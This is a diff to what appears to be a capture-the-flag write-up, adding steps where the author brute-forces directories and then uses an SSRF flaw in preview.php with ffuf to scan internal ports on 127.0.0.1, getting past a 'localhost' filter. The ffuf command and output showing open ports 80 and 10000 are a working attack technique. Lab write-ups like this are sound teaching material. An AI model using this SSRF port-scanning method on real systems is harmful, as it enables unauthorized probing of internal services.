@@ -71,3 +71,36 @@ http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fserver-status%2F
 
 ![Management Page](images/06-management.png)
 
+8. I tried finding more directories with [RAFT Large Directory List](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt), But nothing fancy showed up! Only the `localhost` keyword was blocked, so I didn't fall into that **Rabbit Hole** anymore! 🐰
+
+9. A new Idea! Lets Brute-Force **Ports** on host, **Internally**! 🤌
+```sh
+seq 1 65535 > ports.txt
+ffuf -w ports.txt -u "http://$TARGET/preview.php?url=http%3A%2F%2F127.0.0.1:FUZZ" -fw 1
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://$TARGET/preview.php?url=http%3A%2F%2F127.0.0.1:FUZZ
+ :: Wordlist         : FUZZ: ports.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response words: 1
+________________________________________________
+
+80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
+10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
+```
+**Attention**: `-fl 1` didn't work, because response on port `10000` has only `1` line of code.
+
